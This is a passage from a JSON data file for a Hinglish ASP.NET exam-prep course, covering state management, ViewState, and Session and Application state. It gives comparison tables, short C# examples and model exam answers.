MaximumValue=\"60\"\n     ErrorMessage=\"Age 18 to 60\" ForeColor=\"Red\" />\n```\n\n**Server-side check:** `if (Page.IsValid) { ...save... }` — client script bypass ho sakta hai, isliye server par `IsValid` dekhna zaroori.\n\n**Diagram:** Refer to the ASP.NET Server Controls — Types diagram."
      }
    ]
  },
  {
    "id": "state-management",
    "number": "4.6",
    "title": "ASP.NET State Management — Introduction",
    "subtitle": "Client-side vs server-side state, aur kaun kab",
    "icon": "database",
    "accent": "#00e676",
    "englishDefinition": "ASP.NET state management is the set of techniques used to preserve information about a user and the application between requests, because HTTP is a stateless protocol and every request creates a new Page object. Techniques are classified as client-side, where state is stored on the browser and travels with each request - view state (a base64 encoded hidden field, per page), control state, hidden fields, cookies (small text files, per browser, ~4 KB each), query strings (values in the URL, visible and limited in length) and the unencrypted URL/query approach - or server-side, where state is kept on the server and only an identifier goes to the client - session state (per user, Session object, in-process/StateServer/SQL Server, timeout), application state (Application object, shared by all users, lost on restart) and the cache object. Choice depends on size, lifetime, security, scalability and whether state must survive a server restart or a web farm. View state is enabled by default on controls, session defaults to 20 minutes in-process, and application state is read-mostly global data such as counters or configuration.",
    "intro": "HTTP **stateless** hai — har request naya page object banata hai, pichhli request ki yaad nahi rehti. State management ka matlab: **request ke baad cheezein yaad rakhna**. Do bade ghar hain — **client-side** (ViewState, hidden field, cookie, query string — data browser ke paas jaata hai) aur **server-side** (Session, Application, Cache — data server par rehta hai, client ke paas sirf ID jaata hai). Exam mein har technique ka scope, size, security aur lifetime compare karwana aam sawaal hai.",
    "sections": [
      {
        "type": "definition",
        "title": "State management kya hai",
        "kicker": "Basics",
        "body": "State management = ek request se doosri request tak **user ka data yaad rakhna**. HTTP stateless hai aur ASP.NET har request par naya Page object banata hai, isliye values ko explicitly kahin store karna padta hai.",
        "body2": "Technique chunne ke 4 paimane: **kitna data** (size), **kitni der** (lifetime), **kitna sensitive** (security — client ko bhejna safe hai ya nahi), aur **kitne users/servers** (single server ya web farm / restart ke baad bachna hai ya nahi).",
        "chips": [
          "client-side",
          "server-side",
          "stateless HTTP",
          "scope",
          "security"
        ]
      },
      {
        "type": "cards",
        "title": "Do bade groups",
        "kicker": "Key Points",
        "cards": [
          {
            "icon": "device",
            "title": "Client-side state",
            "body": "Data browser ke paas: ViewState (hidden field), Control state, hidden field, Cookie, Query String. Client ke paas jaata hai."
          },
          {
            "icon": "cloud",
            "title": "Server-side state",
            "body": "Data server par: Session (per user), Application (sab users), Cache. Client ko sirf ID (SessionId) milta hai."
          },
          {
            "icon": "check",
            "title": "ViewState",
            "body": "Base64 hidden field; page-specific; postback ke liye controls ki values; tamper ho sakta hai (MAC se protect)."
          },
          {
            "icon": "user",
            "title": "Session",
            "body": "Per user dictionary; timeout 20 min default; InProc / StateServer / SQL Server; login, cart."
          },
          {
            "icon": "globe",
            "title": "Application",
            "body": "Sab users ke liye common; server restart par khatam; counters, app-wide config."
          },
          {
            "icon": "link",
            "title": "Query string & cookie",
            "body": "Query string URL mein (visible, bookmarkable); cookie browser mein (~4 KB), expiry set kar sakte ho."
          }
        ]
      },
      {
        "type": "comparison",
        "title": "Client-side vs Server-side state",
        "kicker": "Comparison",
        "columns": [
          "Client-side",
          "Server-side"
        ],
        "rows": [
          {
            "label": "Kahan",
            "values": [
              "browser (hidden field / cookie / URL)",
              "server memory or database"
            ]
          },
          {
            "label": "Examples",
            "values": [
              "ViewState, cookie, query string",
              "Session, Application, Cache"
            ]
          },
          {
            "label": "Size limit",
            "values": [
              "chhota (page size badhta hai)",
              "bada (server resources)"
            ]
          },
          {
            "label": "Security",
            "values": [
              "kam — user dekh/badal sakta hai",
              "zyada — client ko ID hi jaata hai"
            ]
          },
          {
            "label": "Scalability",
            "values": [
              "behtar (server par load nahi)",
              "web farm mein config chahiye"
            ]
          },
          {
            "label": "Lifetime",
            "values": [
              "page / browser tak",
              "timeout / app restart tak"
            ]
          },
          {
            "label": "Best use",
            "values": [
              "postback values, user preference",
              "login, cart, shared counters"
            ]
          }
        ],
        "columnColors": [
          "#00d4ff",
          "#00e676"
        ]
      },
      {
        "type": "comparison",
        "title": "Sab techniques ek table mein",
        "kicker": "Comparison",
        "columns": [
          "ViewState",
          "Cookie",
          "Query String",
          "Session",
          "Application"
        ],
        "rows": [
          {
            "label": "Stored at",
            "values": [
              "page",
              "browser",
              "URL",
              "server",
              "server"
            ]
          },
          {
            "label": "Scope",
            "values": [
              "ek page",
              "browser",
              "request",
              "ek user",
              "sab users"
            ]
          },
          {
            "label": "Type",
            "values": [
              "any serialisable",
              "string (text)",
              "string",
              "any object",
              "any object"
            ]
          },
          {
            "label": "Limit",
            "values": [
              "page size",
              "~4 KB / cookie",
              "URL length",
              "memory",
              "memory"
            ]
          },
          {
            "label": "Security",
            "values": [
              "medium",
              "low",
              "low",
              "high",
              "high"
            ]
          },
          {
            "label": "Lifetime",
            "values": [
              "page",
              "expiry tak",
              "us URL tak",
              "timeout",
              "app tak"
            ]
          },
          {
            "label": "Survives restart",
            "values": [
              "page reload",
              "haan",
              "haan",
              "InProc: nahi",
              "nahi"
            ]
          }
        ],
        "columnColors": [
          "#aa00ff",
          "#00d4ff",
          "#ff8800",
          "#00e676",
          "#ff5252"
        ]
      },
      {
        "type": "code",
        "title": "Sab techniques — chhota example",
        "kicker": "Code",
        "code": "// 1. ViewState — page ke andar\nViewState[\"count\"] = 5;\nint c = (int)ViewState[\"count\"];\n\n// 2. Cookie — browser mein\nResponse.Cookies[\"theme\"].Value = \"dark\";\nResponse.Cookies[\"theme\"].Expires = DateTime.Now.AddDays(30);\nstring theme = Request.Cookies[\"theme\"]?.Value ?? \"light\";\n\n// 3. Query string — URL mein\nResponse.Redirect(\"Result.aspx?roll=21&name=Riya\");\nstring roll = Request.QueryString[\"roll\"];\n\n// 4. Session — per user (server par)\nSession[\"user\"] = \"riya\";\nstring user = Session[\"user\"] as string;\nSession.Timeout = 30;          // minutes\n\n// 5. Application — sab users ke liye\nApplication.Lock();\nApplication[\"visits\"] = (int)(Application[\"visits\"] ?? 0) + 1;\nApplication.UnLock();",
        "language": "csharp",
        "filename": "StateDemo.aspx.cs",
        "intro": "Har technique ka apna collection hai: ViewState, Request.Cookies, Request.QueryString, Session, Application.",
        "note": "Application.Lock/UnLock zaroori hai — kai users ek saath badal sakte hain."
      },
      {
        "type": "points",
        "title": "Kaun kab — decision guide",
        "kicker": "Choose",
        "points": [
          "**Postback ke andar control ki value** → ViewState (default on).",
          "**User preference jo browser band hone ke baad bhi chahiye** → Cookie (expiry ke saath).",
          "**Link/share/email karna hai, chhota data** → Query string (sensitive data nahi!).",
          "**Login, cart, per-user data, sensitive** → Session (InProc fast, web farm mein StateServer/SQL).",
          "**Site-wide counter, config, read-mostly** → Application (Lock/UnLock ke saath) ya Cache.",
          "**Bada data jo web farm me survive kare** → database; session/cache sirf upar ki layer."
        ]
      },
      {
        "type": "diagram",
        "title": "State Management Techniques",
        "kicker": "Diagram",
        "diagram": "wt4-state",
        "caption": "Client-side (ViewState, Cookie, QueryString) vs Server-side (Session, Application, Cache)"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Stateless HTTP** → state management zaroori; har request naya Page object.",
          "**Client-side:** ViewState (page), hidden field, cookie (~4 KB), query string (URL) — data client ke paas.",
          "**Server-side:** Session (per user, timeout), Application (sab users), Cache — data server par.",
          "**ViewState:** base64 hidden field, page-level, tampering se MAC; bada ho to page slow.",
          "**Session:** per-user, InProc default, 20 min timeout, web farm ke liye StateServer/SQL Server.",
          "**Application:** global, restart par khatam, concurrent write ke liye Lock/UnLock."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "What is state management in ASP.NET? Explain client-side and server-side techniques.",
        "answer": "**State management** = requests ke beech user ka data preserve karna, kyunki HTTP stateless hai aur har request par naya Page object banta hai.\n\n**Client-side techniques** (data browser ke paas rehta hai):\n\n| Technique | Kahan | Scope | Note |\n|---|---|---|---|\n| **ViewState** | page ka hidden field (`__VIEWSTATE`) | ek page | base64, tamper se MAC; bada to page slow |\n| **Control state** | hidden field | control | ViewState off hone par bhi chalta hai |\n| **Hidden field** | page | ek page | plain text, user dekh sakta hai |\n| **Cookie** | browser | browser/user | ~4 KB, expiry set ho sakti hai |\n| **Query string** | URL | link tak | visible, bookmarkable, limit hai |\n\n**Server-side techniques** (data server par):\n\n| Technique | Scope | Note |\n|---|---|---|\n| **Session** | ek user | default 20 min, InProc/StateServer/SQL Server |\n| **Application** | sab users | restart par khatam, Lock/UnLock |\n| **Cache** | application | expiry/dependency support |\n\n**Chunne ke paimane:** size, lifetime, security, scalability (web farm), restart survival.\n\n**Example:**\n```csharp\nViewState[\"n\"] = 1;              // client-side\nSession[\"user\"] = \"riya\";        // server-side\nApplication[\"hits\"] = 10;        // global\n```\n\n**Rule of thumb:** sensitive/zyada data → server-side; chhota, per-page, non-sensitive → client-side.\n\n**Diagram:** Refer to the State Management Techniques diagram."
      },
      {
        "question": "Differentiate between ViewState, Session, Application, Cookie and Query String.",
        "answer": "Paanch techniques ka comparison ek nazar mein:\n\n| Point | ViewState | Session | Application | Cookie | Query String |\n|---|---|---|---|---|---|\n| Stored at | page (hidden field) | server | server | browser | URL |\n| Scope | ek page | ek user | sab users | ek browser | ek request/link |\n| Type | object (serialisable) | object | object | string | string |\n| Size limit | page size | memory | memory | ~4 KB | URL length |\n| Security | medium (MAC) | high | high | low (user dekh sakta) | low (URL mein) |\n| Lifetime | page/postback | timeout (20 min) | app restart tak | expiry tak | link tak |\n| Restart par | page reload | InProc: khatam | khatam | bacha rehta | URL ke saath |\n| Best use | control values | login, cart | counter, config | theme, preference | id/filter share |\n\n**Kuch practical baatein:**\n- ViewState sirf **postback** ke liye useful; `EnableViewState=\"false\"` se size kam.\n- Session **cookieless** bhi ho sakta hai (URL mein SessionId) — `Web.config` se.\n- Application mein write karte waqt `Lock()` / `UnLock()` — warna race condition.\n- Cookie mein **sensitive data nahi** (encrypt karo ya session use karo).\n- Query string **SQL injection** ke liye khatra — parameterised query + validation.\n\n**Diagram:** Refer to the State Management Techniques diagram."
      },
      {
        "question": "Explain the different session state modes (InProc, StateServer, SQL Server) with their advantages and disadvantages.",
        "answer": "Session state ke **storage modes** `Web.config` ke `<sessionState mode=\"...\">` se set hote hain.\n\n| Mode | Kahan store | Speed | Web farm | Restart survival |\n|---|---|---|---|---|\n| **InProc** (default) | IIS worker process ki memory | fastest | nahi | nahi |\n| **StateServer** | alag `aspnet_state.exe` service (TCP) | medium | haan | haan |\n| **SQLServer** | SQL Server table (tempdb/ASPState) | slowest | haan | haan |\n| **Custom** | apna provider | depends | haan | depends |\n| **Off** | session band | — | — | — |\n\n**1. InProc**\n- Sabse fast (no serialisation, in-memory).\n- Worker process recycle/app pool restart par session **khatam**.\n- Web farm mein multiple servers apni-apni memory rakhte hain → session share nahi.\n\n**2. StateServer**\n- `aspnet_state` service separate machine par; session objects **serialisable** hone chahiye.\n- Web farm + restart survive; network round-trip se InProc se slow.\n\n**3. SQL Server**\n- Session data SQL Server table mein; server crash par bhi safe; web garden/farm ke liye best.\n- Sabse slow (DB round-trip), par most reliable.\n\n**Config example:**\n```xml\n<sessionState mode=\"SQLServer\"\n   sqlConnectionString=\"data source=.;integrated security=SSPI\"\n   timeout=\"30\" />\n```\n\n**Timeout:** `timeout` minutes mein (default 20); `Session.Abandon()` se logout par clear, `Session.Clear()` se saare items.\n\n**Diagram:** Refer to the State Management Techniques diagram."
      }
    ]
  },
  {
    "id": "view-state",
    "number": "4.7",
    "title": "ASP.NET View State",
    "subtitle": "__VIEWSTATE hidden field — kaam, safety aur kam karne ke tarike",
    "icon": "eye",
    "accent": "#aa00ff",
    "englishDefinition": "View state is the default client-side state mechanism of ASP.NET Web Forms: the page serialises the property values of its server controls into a Base64 encoded string, puts it in a hidden field named __VIEWSTATE, and the browser posts that field back on the next postback, where ASP.NET deserialises it and restores the control values before Page_Load. It is stored per page (not per user), is enabled by default (EnableViewState=true on page and control), and can carry any serialisable object via ViewState['key']. View state is protected against tampering with a machine authentication code (MAC) - and can be encrypted with ViewStateEncryptionMode='Always' - but it is not a security mechanism for secrets because the data is sent to the client. It increases page size, so large grids or repeaters should set EnableViewState='false'. View state differs from control state, which cannot be disabled and holds essential control data, and from session, which is server-side per user. View state can be moved to the bottom of the page with Page.RegisterViewStateHandler or kept out of the page with SessionPageStatePersister.",
    "intro": "ViewState wo **bada Base64 wala hidden field** hai jo aapne kisi purane ASP.NET page ka HTML source dekha ho to zaroor notice kiya hoga. Kaam: postback ke baad controls ki values (textbox ka text, grid ka data) wapas bhar dena — kyunki har request naya page object hai. Important points: ye **client ke paas** jaata hai (isliye secret nahi rakho), tamper-proof hone ke liye MAC hota hai, aur bada hone par page slow ho jaata hai. Exam mein 'ViewState kya hai, iske fayde/nuksaan, disable kaise' poochha jaata hai.",
    "sections": [
      {
        "type": "definition",
        "title": "ViewState kya hai",
        "kicker": "Definition",
        "body": "ViewState ek **hidden field** (`__VIEWSTATE`) hai jismein page ke server controls ki property values **Base64 encoded** form mein hoti hain. Postback par browser ye field wapas bhejta hai, ASP.NET decode karke control values restore karta hai — isliye button click ke baad bhi textbox ka text aur GridView ka data bacha rehta hai.",
        "body2": "Ye **per page** hota hai, per user nahi; default **on** hota hai; aur sirf **same page** ke postback mein kaam aata hai. ViewState mein apna data bhi rakh sakte ho: `ViewState['key'] = value`.",
        "chips": [
          "__VIEWSTATE",
          "Base64",
          "per page",
          "postback",
          "MAC protected"
        ]
      },
      {
        "type": "cards",
        "title": "ViewState ke fayde aur nuksaan",
        "kicker": "Key Points",
        "cards": [
          {
            "icon": "check",
            "title": "Fayda — automatic",
            "body": "Controls ki values khud bachti hain — developer ko code likhna nahi padta."
          },
          {
            "icon": "zap",
            "title": "Fayda — no server memory",
            "body": "Client ke paas rehta hai, server par per-user memory nahi lagti (session se sasta)."
          },
          {
            "icon": "shield",
            "title": "Fayda — tamper detection",
            "body": "MAC (machine key) se badla hua ViewState reject ho jaata hai; chaho to encrypt bhi kar sakte ho."
          },
          {
            "icon": "alert",
            "title": "Nuksaan — page size",
            "body": "Base64 text page ka size badha deta hai → slow load, bandwidth waste."
          },
          {
            "icon": "eye",
            "title": "Nuksaan — visible data",
            "body": "Client dekh sakta hai (decode karke) — password/secret kabhi na rakho."
          },
          {
            "icon": "wifi",
            "title": "Nuksaan — sirf same page",
            "body": "Doosre page par ViewState automatically nahi jaata (cross-page posting exception)."
          }
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "ViewState ka use — counter aur decode",
        "code": "using System;\n\npublic partial class Counter : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            ViewState[\"clicks\"] = 0;\n        }\n        lblCount.Text = \"Clicks: \" + ViewState[\"clicks\"];\n    }\n\n    protected void btnClick_Click(object sender, EventArgs e)\n    {\n        int n = (int)ViewState[\"clicks\"];\n        ViewState[\"clicks\"] = n + 1;\n        lblCount.Text = \"Clicks: \" + ViewState[\"clicks\"];\n    }\n}",
        "language": "csharp",
        "filename": "Counter.aspx.cs",
        "php": "Page load:      Clicks: 0\n\n[ Click me ]  ->  Clicks: 1\n[ Click me ]  ->  Clicks: 2\n\n(har click ke baad __VIEWSTATE field badi hoti jaati hai)",
        "label": "Rendered output",
        "height": 220,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "`ViewState[\"clicks\"]` postback ke paar value yaad rakhta hai — bina session ke."
      },
      {
        "type": "points",
        "title": "ViewState ko chhota aur safe rakhne ke tarike",
        "kicker": "Optimise",
        "points": [
          "**`EnableViewState='false'`** — jahan zaroorat nahi (Label, static text, bade read-only grids) par band karo.",
          "**`ViewStateMode='Disabled'`** — page par band, sirf chune hue controls par on (ASP.NET 4+) — behtar control.",
          "**Page/control level:** `<%@ Page EnableViewState='false' %>` poore page ke liye.",
          "**Encryption:** `<%@ Page ViewStateEncryptionMode='Always' %>` ya Web.config mein `viewStateEncryptionMode`.",
          "**`SessionPageStatePersister`** — ViewState server (session) mein rakho, page halka.",
          "**`Page.RegisterViewStateHandler()`** / `Page.ViewStateUserKey` — field page ke bottom mein, aur per-user binding.",
          "**Secret data kabhi nahi** — ViewState client ke paas jaata hai, sirf MAC/encryption tampering rokta hai (confidentiality ka bharosa na karo)."
        ]
      },
      {
        "type": "comparison",
        "title": "ViewState vs Control State vs Session",
        "kicker": "Comparison",
        "columns": [
          "ViewState",
          "Control State",
          "Session"
        ],
        "rows": [
          {
            "label": "Kahan",
            "values": [
              "page (hidden field)",
              "page (hidden field)",
              "server"
            ]
          },
          {
            "label": "Scope",
            "values": [
              "ek page",
              "ek control",
              "ek user"
            ]
          },
          {
            "label": "Disable",
            "values": [
              "haan (EnableViewState)",
              "nahi (essential)",
              "haan (sessionState off)"
            ]
          },
          {
            "label": "Kis ke liye",
            "values": [
              "control values, custom data",
              "control ka critical data",
              "login, cart"
            ]
          },
          {
            "label": "Size impact",
            "values": [
              "bada ho sakta hai",
              "chhota",
              "page par asar nahi"
            ]
          }
        ],
        "columnColors": [
          "#aa00ff",
          "#00d4ff",
          "#00e676"
        ]
      },
      {
        "type": "diagram",
        "title": "View State — Round Trip",
        "kicker": "Diagram",
        "diagram": "wt4-viewstate",
        "caption": "Server values → Base64 hidden field → browser POST → server restore → naya HTML"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**ViewState:** Base64 encoded hidden field `__VIEWSTATE`; per page; default on.",
          "**Kaam:** postback par control values restore karna; `ViewState['key']` se apna data.",
          "**Safety:** MAC se tamper-proof, `ViewStateEncryptionMode` se encrypted — phir bhi client dekh sakta hai.",
          "**Nuksaan:** page size badhta hai, bandwidth; bade grids par band karo.",
          "**Kam karne ke tarike:** `EnableViewState='false'`, `ViewStateMode`, `SessionPageStatePersister`.",
          "**Control state** band nahi hota; **Session** server-side per user hota hai."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "What is ViewState in ASP.NET? Explain its working, advantages and limitations.",
        "answer": "**ViewState** ASP.NET ka client-side state mechanism hai jo postback ke baad server controls ki values bachata hai.\n\n**Working:**\n1. Page render hote waqt ASP.NET control properties ko serialize karke **Base64** string banata hai.\n2. Wo string `__VIEWSTATE` naam ke **hidden field** mein page ke andar daal di jaati hai.\n3. User jab button dabata hai, browser wahi hidden field wapas server par POST karta hai.\n4. ASP.NET usko decode karke control values restore karta hai (**PreLoad** stage mein), phir `Page_Load` chalta hai.\n5. Isliye textbox ka text, dropdown ka selection, GridView ka data bacha rehta hai.\n\n**Fayde:**\n- Automatic — developer ko extra code nahi likhna padta.\n- Server par per-user memory nahi lagti (session se sasta).\n- Tampering se MAC (machine authentication code) se protected; encryption bhi possible.\n- Apna data bhi rakh sakte ho: `ViewState[\"count\"] = 5;`\n\n**Limitations:**\n- Page ka size badh jaata hai (Base64 ~33% bada) → slow load/bandwidth.\n- Client decode karke dekh sakta hai — **sensitive data na rakho**.\n- Sirf same page ke postback par kaam karta hai.\n- Web farm mein machine key same honi chahiye warna invalid view state error.\n\n**Kam karne ke tarike:** `EnableViewState=\"false\"`, `ViewStateMode=\"Disabled\"`, `SessionPageStatePersister`, bade read-only grids par off.\n\n**Diagram:** Refer to the View State — Round Trip diagram."
      },
      {
        "question": "How can you improve the performance of a page that has a large ViewState? Explain the options.",
        "answer": "Bada ViewState page ko bhaari banata hai — HTML bada, upload/download slow, CPU par Base64 decode ka load.\n\n**1. ViewState band karo jahan zaroorat nahi:**\n```html\n<%@ Page EnableViewState=\"false\" %>\n<asp:GridView ID=\"gv\" runat=\"server\" EnableViewState=\"false\" />\n```\nStatic labels, headings, read-only grids ko ViewState ki zaroorat nahi.\n\n**2. ViewStateMode (ASP.NET 4+):**\n```html\n<%@ Page ViewStateMode=\"Disabled\" %>\n<asp:TextBox ID=\"txt\" runat=\"server\" ViewStateMode=\"Enabled\" />\n```\nPage par by default off, sirf chune hue controls par on — `EnableViewState=\"false\"` se behtar kyunki child override ho sakta hai.\n\n**3. Server-side ViewState:** `SessionPageStatePersister` use karo — ViewState session mein rehta hai, page halka:\n```csharp\nprotected override PageStatePersister PageStatePersister\n{\n    get { return new SessionPageStatePersister(this); }\n}\n```\n\n**4. ViewState page ke bottom mein:** `Page.RegisterViewStateHandler()` — render blocking kam.\n\n**5. Paging/partial data:** GridView mein `AllowPaging=\"true\"` + `PageSize`, ya sirf zaroori columns bind karo.\n\n**6. Compression:** HTTP compression (`<httpCompression>`) se transfer size kam.\n\n**7. Data caching:** GridView ka data `Cache`/`Session` mein rakho, har postback par DB hit na karo.\n\n**Trade-off:** ViewState band karne se custom code likhna pad sakta hai (values khud restore karo); isliye selective disable best hai.\n\n**Diagram:** Refer to the View State — Round Trip diagram."
      },
      {
        "question": "Differentiate between ViewState, Control State and Session state.",
        "answer": "Teeno state bachate hain, par scope aur behaviour alag hai.\n\n| Point | ViewState | Control State | Session |\n|---|---|---|---|\n| Kahan store | page ka hidden field | page ka hidden field | server (memory/DB) |\n| Scope | ek page | ek control | ek user (sab pages) |\n| Default | on | on (aur band nahi hota) | on (InProc, 20 min) |\n| Disable | `EnableViewState=\"false\"` | band nahi kar sakte | `sessionState mode=\"Off\"` |\n| Kis data ke liye | control properties + custom | control ka critical data (pnl, pager) | login, cart, user profile |\n| Size impact | bada ho sakta hai | chhota | page par asar nahi |\n| Security | client dekh sakta hai (MAC) | client dekh sakta hai | server par, zyada safe |\n| Cross page | nahi (cross-page posting exception) | nahi | haan (sab pages) |\n| Restart par | page reload par jaata hai | page reload par jaata hai | InProc: khatam |\n\n**Control state kyun:** kuch controls (GridView pager, Panel visibility) tab bhi kaam karein jab developer ne ViewState band kiya ho — isliye control state ko alag hidden field (`__CALLBACKPARAM`/control state) mein rakha jaata hai.\n\n**ViewState vs Session:** ViewState client-side per-page (page size badhta), Session server-side per-user (server memory). Bade data → Session/Cache; chhota per-page → ViewState.\n\n**Diagram:** Refer to the View State — Round Trip diagram."
      }
    ]
  },
  {
    "id": "session-application-state",
    "number": "4.8",
    "title": "Session State and Application State",
    "subtitle": "Per-user Session aur global Application object",
    "icon": "users",
    "accent": "#ff5252",
    "englishDefinition": "Session state stores per-user data on the server in the Session object (HttpSessionState) keyed by a unique SessionID that is passed to the client in a cookie (ASP.NET_SessionId) or in the URL when cookieless mode is used. Values survive across pages and requests for one browser session, expire after the configured timeout (20 minutes default, sliding), and can be stored InProc (default, worker process memory), in a StateServer service, in SQL Server, or via a custom provider; only serialisable objects can leave the process. Events Session_Start and Session_End (Global.asax) fire when a session begins and times out, and Session.Abandon()/Session.Clear() end or empty it. Application state uses the Application object (HttpApplicationState), a name-value collection shared by every user of the application, created when the first request arrives and destroyed when the application (app pool) restarts; Application_Start/Application_End in Global.asax handle lifecycle, and Application.Lock()/Unlock() are required around writes because many requests may update the same key concurrently. Application state is suited to small, read-mostly global data such as counters or configuration values, while per-user data belongs in session.",
    "intro": "Do object jo pehli baar dekhne par ek jaise lagte hain: **Session** (mere liye — ek user ke liye private) aur **Application** (sabke liye — poori website ke liye common). Session mein login, cart, user preferences; Application mein site-wide counter, config, shared cache. Dono server par rehte hain, isliye client dekh nahi sakta — par Session ka timeout hota hai aur Application app pool restart par khatam ho jaata hai. Application mein likhte waqt **Lock/UnLock** bhoolna exam ka favourite trap hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Session aur Application state",
        "kicker": "Definition",
        "body": "**Session state** ek user ka data server par rakhta hai — `Session['user'] = 'riya'`. Browser ke paas sirf `SessionID` (cookie mein) jaata hai, data nahi. Isliye ye login/cart jaisi sensitive cheezon ke liye theek hai, aur bahut saare pages par available rehta hai.",
        "body2": "**Application state** poori application ke liye ek hi object hai — `Application['visits']`. Sab users isi ko dekhte/badalte hain; application start par banta hai, app pool restart par khatam. Global counters, config values ke liye.",
        "chips": [
          "Session: per user",
          "Application: global",
          "SessionID",
          "timeout 20 min",
          "Lock/UnLock"
        ]
      },
      {
        "type": "comparison",
        "title": "Session vs Application",
        "kicker": "Comparison",
        "columns": [
          "Session",
          "Application"
        ],
        "rows": [
          {
            "label": "Scope",
            "values": [
              "ek user",
              "sab users"
            ]
          },
          {
            "label": "Object",
            "values": [
              "HttpSessionState",
              "HttpApplicationState"
            ]
          },
          {
            "label": "Kaise pahunchta",
            "values": [
              "SessionID (cookie/URL)",
              "koi ID nahi — site-wide"
            ]
          },
          {
            "label": "Lifetime",
            "values": [
              "timeout (default 20 min)",
              "app start → app end"
            ]
          },
          {
            "label": "Events",
            "values": [
              "Session_Start / Session_End",
              "Application_Start / Application_End"
            ]
          },
          {
            "label": "Concurrency",
            "values": [
              "ek user — safe",
              "Lock/UnLock zaroori"
            ]
          },
          {
            "label": "Best use",
            "values": [
              "login, cart, profile",
              "counter, config, shared data"
            ]
          }
        ],
        "columnColors": [
          "#00e676",
          "#ff5252"
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Session — login aur logout",
        "code": "using System;\n\npublic partial class Login : System.Web.UI.Page\n{\n    protected void btnLogin_Click(object sender, EventArgs e)\n    {\n        if (txtUser.Text == \"admin\" && txtPass.Text == \"1234\")\n        {\n            Session[\"user\"] = txtUser.Text;      // per-user data\n            Session[\"role\"] = \"Admin\";\n            Session.Timeout = 30;               // minutes\n            Response.Redirect(\"Dashboard.aspx\");\n        }\n        else\n        {\n            lblMsg.Text = \"Invalid login\";\n        }\n    }\n\n    protected void btnLogout_Click(object sender, EventArgs e)\n    {\n        Session.Clear();      // saare items hatao\n        Session.Abandon();    // session khatam\n        Response.Redirect(\"Login.aspx\");\n    }\n}",
        "language": "csharp",
        "filename": "Login.aspx.cs",
        "php": "Dashboard.aspx (login ke baad):\nWelcome riya (Admin)\n\nLogout ke baad Login.aspx:\nInvalid login likhne par wahi page, session khaali",
        "label": "Rendered output",
        "height": 250,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "`Session[\"user\"]` kisi bhi page par available — isliye `if (Session[\"user\"] == null) Response.Redirect(\"Login.aspx\");` se protection."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Application — global hit counter",
        "code": "// Global.asax\nvoid Application_Start(object sender, EventArgs e)\n{\n    Application[\"visits\"] = 0;\n    Application[\"startTime\"] = DateTime.Now;\n}\n\nvoid Session_Start(object sender, EventArgs e)\n{\n    Application.Lock();                          // race se bachao\n    Application[\"visits\"] = (int)Application[\"visits\"] + 1;\n    Application.UnLock();\n}\n\n// Any page\nprotected void Page_Load(object sender, EventArgs e)\n{\n    lblVisits.Text = \"Total visits: \" + Application[\"visits\"];\n    lblSince.Text  = \"Running since: \" + Application[\"startTime\"];\n}",
        "language": "csharp",
        "filename": "Global.asax + Page",
        "php": "Total visits: 1        (pehla user)\nTotal visits: 2        (doosra browser)\nRunning since: 05-11-2026 10:20:11\n\n(app pool restart ke baad counter phir 0)",
        "label": "Rendered output",
        "height": 240,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Application object sab users ke liye ek hi hai — update karte waqt Lock/UnLock zaroori."
      },
      {
        "type": "points",
        "title": "Session ke modes aur zaroori baatein",
        "kicker": "Session",
        "points": [
          "**InProc (default):** worker process ki memory, fastest, par restart par khatam; web farm mein share nahi.",
          "**StateServer:** alag `aspnet_state` service; web farm + restart survive; objects serialisable hone chahiye.",
          "**SQLServer:** session data SQL Server mein; sabse reliable, sabse slow.",
          "**Cookieless:** `cookieless='UseUri'` — SessionID URL mein (mobile/purane browser ke liye); URL bhaari aur bookmark issue.",
          "**Timeout:** sliding expiry, default 20 min; `Session.Timeout = 30` ya Web.config `<sessionState timeout='30'>`.",
          "**Abandon vs Clear:** `Abandon()` session khatam karta hai, `Clear()` saare items hata deta hai.",
          "**Session_End** sirf InProc mein chalta hai — StateServer/SQLServer ke saath nahi."
        ]
      },
      {
        "type": "points",
        "title": "Application state ke rules",
        "kicker": "Application",
        "points": [
          "**Global:** sab users ek hi object dekhte hain — per-user data kabhi na rakho.",
          "**Lock/UnLock:** write ke aas-paas `Application.Lock(); ... Application.UnLock();` warna data corrupt.",
          "**Lifetime:** `Application_Start` par initialise, `Application_End` par cleanup; restart = data gone.",
          "**Web farm:** har server ka apna Application object — global counter ke liye database behtar.",
          "**Kab use karein:** site-wide counter, read-mostly config, shared lookup list (par Cache zyada flexible).",
          "**Cache vs Application:** Cache mein expiry/dependency aur auto-removal hota hai, isliye mostly Cache better."
        ]
      },
      {
        "type": "diagram",
        "title": "Session vs Application State",
        "kicker": "Diagram",
        "diagram": "wt4-session",
        "caption": "Session: har user ka apna box (SessionID) · Application: sabke liye ek global box"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Session:** per-user, server par, SessionID cookie/URL mein; login, cart, preferences.",
          "**Session modes:** InProc (default, fast), StateServer, SQLServer (farm/reliable), Custom, Off.",
          "**Session timeout:** default 20 min (sliding); `Abandon()` khatam, `Clear()` khaali.",
          "**Application:** sab users ke liye ek; `Application_Start/End`; restart par khatam.",
          "**Lock/UnLock:** Application mein write se pehle zaroori.",
          "**Session_End** sirf InProc mode mein fire hota hai."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain Session state and Application state in ASP.NET with their differences.",
